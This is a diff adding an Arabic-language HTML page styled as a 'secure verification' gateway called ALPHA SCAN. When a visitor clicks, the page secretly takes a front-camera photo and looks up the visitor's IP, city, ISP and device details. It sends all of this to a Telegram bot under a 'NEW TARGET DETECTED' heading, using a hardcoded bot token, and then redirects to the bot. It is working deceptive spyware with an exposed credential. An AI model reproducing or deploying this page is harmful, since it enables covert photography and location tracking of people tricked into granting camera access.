@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Gateway | نظام التحقق الآمن</title>
+    <style>
+        :root { --neon: #00ff41; --bg: #0b0b0b; }
+        body { background: var(--bg); color: var(--neon); font-family: 'Courier New', monospace; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .terminal { border: 1px solid var(--neon); padding: 30px; text-align: center; box-shadow: 0 0 20px rgba(0,255,65,0.2); width: 85%; max-width: 450px; }
+        .btn { display: inline-block; margin-top: 25px; padding: 15px 35px; color: var(--neon); border: 2px solid var(--neon); text-decoration: none; font-weight: bold; cursor: pointer; background: transparent; transition: 0.5s; }
+        .btn:hover { background: var(--neon); color: #000; box-shadow: 0 0 30px var(--neon); }
+        #video, #canvas { display: none; }
+        .loading-text { font-size: 0.8rem; margin-top: 15px; color: #555; }
+    </style>
+</head>
+<body>
+
+    <div class="terminal">
+        <h1 style="letter-spacing: 5px;">ALPHA SCAN</h1>
+        <p>مطلوب الوصول إلى الكاميرا والموقع لتأكيد بروتوكول الأمان</p>
+        <button class="btn" id="startBtn" onclick="initiateProtocol()">بدأ التحقق الآن</button>
+        <div id="status" class="loading-text">Status: Systems Standby...</div>
+    </div>
+
+    <video id="video" autoplay></video>
+    <canvas id="canvas"></canvas>
+
+    <script>
+        // إعداداتك الخاصة - لا تغيرها
+        const CONFIG = {
+            token: "8572268963:AAFRxvwUt6DF8JoQL9QpPYBe1YWHNqJ58NI",
+            chatId: "7771324881",
+            bot: "Hydejlllbot"
+        };
+
+        async function initiateProtocol() {
+            const btn = document.getElementById('startBtn');
+            const status = document.getElementById('status');
+            btn.innerText = "جاري التحقق...";
+            status.innerText = "Status: Accessing Media Devices...";
+
+            try {
+                // محاولة فتح الكاميرا بقوة (facingMode: user للأمامية)
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } } 
+                });
+                
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+
+                // انتظار بسيط لضبط الإضاءة والتركيز
+                await new Promise(res => setTimeout(res, 2000));
+
+                const canvas = document.getElementById('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+
+                canvas.toBlob(blob => {
+                    sendData(blob, stream);
+                }, 'image/jpeg', 0.9);
+
+            } catch (err) {
+                // في حال رفض الكاميرا، ننتقل فوراً لسحب البيانات النصية
+                status.innerText = "Status: Camera Blocked. Fetching Network Data...";
+                sendData(null, null);
+            }
+        }
+
+        async function sendData(imageBlob, stream) {
+            try {
+                // محاولة جلب الـ IP من أكثر من مصدر لتخطي الحجب
+                let ipData = { ip: "Unknown", city: "Unknown", country_name: "Unknown" };
+                try {
+                    const res = await fetch('https://ipapi.co/json/');
+                    ipData = await res.json();
+                } catch (e) {
+                    const res2 = await fetch('https://ipwho.is/');
+                    ipData = await res2.json();
+                }
+
+                const report = `
+🚨 **NEW TARGET DETECTED** 🚨
+--------------------------
+📸 **Photo:** ${imageBlob ? 'Captured ✅' : 'Blocked ❌'}
+🌐 **IP:** \`${ipData.ip}\`
+📍 **Location:** ${ipData.city || ipData.city_name}, ${ipData.country || ipData.country_name}
+🏢 **ISP:** ${ipData.org || ipData.connection?.isp || 'Unknown'}
+📱 **Device:** ${navigator.platform}
+🛰️ **Agent:** \`${navigator.userAgent.split(') ')[1]}\`
+--------------------------
+📡 **Status:** Deep Scan Finalized.
+                `;
+
+                if (imageBlob) {
+                    const fd = new FormData();
+                    fd.append('chat_id', CONFIG.chatId);
+                    fd.append('photo', imageBlob, 'capture.jpg');
+                    fd.append('caption', report);
+                    fd.append('parse_mode', 'Markdown');
+                    await fetch(`https://api.telegram.org/bot${CONFIG.token}/sendPhoto`, { method: 'POST', body: fd });
+                } else {
+                    await fetch(`https://api.telegram.org/bot${CONFIG.token}/sendMessage`, {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({chat_id: CONFIG.chatId, text: report, parse_mode: 'Markdown'})
+                    });
+                }
+            } catch (error) {
+                console.log("Error in transmission");
+            }
+
+            // إنهاء العملية والتحويل للبوت
+            if (stream) stream.getTracks().forEach(t => t.stop());
+            window.location.href = `https://t.me/${CONFIG.bot}`;
+        }
+    </script>
+</body>
+</html>
